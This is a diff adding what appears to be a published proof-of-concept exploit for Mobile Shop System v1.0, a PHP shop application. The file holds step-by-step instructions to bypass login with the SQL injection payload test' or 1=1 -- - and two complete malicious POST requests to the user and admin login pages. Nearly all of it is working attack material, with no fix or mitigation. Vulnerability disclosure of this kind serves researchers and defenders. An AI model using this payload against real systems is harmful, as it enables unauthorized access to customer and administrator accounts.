@@ -1,0 +1,45 @@
+# Title: Mobile Shop System v1.0 - SQLi lead to authentication bypass
+# Exploit Author: Moaaz Taha (0xStorm)
+# Date: 2020-09-08
+# Vendor Homepage: https://www.sourcecodester.com/php/14412/mobile-shop-system-php-mysql.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14412&title=Mobile+Shop+System+in+PHP+MySQL
+# Version: 1.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 3.2.4
+
+# POC
+1- Go to "http://TARGET/mobileshop-master/login.php" or "http://TARGET/mobileshop-master/LoginAsAdmin.php"
+2- Inject this SQL payload (test' or 1=1 -- -) in email field and any password in password field.
+3- Click on "login", then you will bypass the authentication successfully.
+
+# Malicious HTTP POST Requests
+
+POST /mobileshop-master/login.php HTTP/1.1
+Host: 192.168.1.55:8888
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.55:8888/mobileshop-master/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+email=test%27+or+1%3D1+--+-&password=test123
+
+==========================================================================
+
+POST /mobileshop-master/LoginAsAdmin.php HTTP/1.1
+Host: 192.168.1.55:8888
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.55:8888/mobileshop-master/LoginAsAdmin.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Connection: close
+Cookie: PHPSESSID=d7c49f6634a208dca0624f2f6b1d27b6
+Upgrade-Insecure-Requests: 1
+
+email=test%27+or+1%3D1+--+-&password=test123
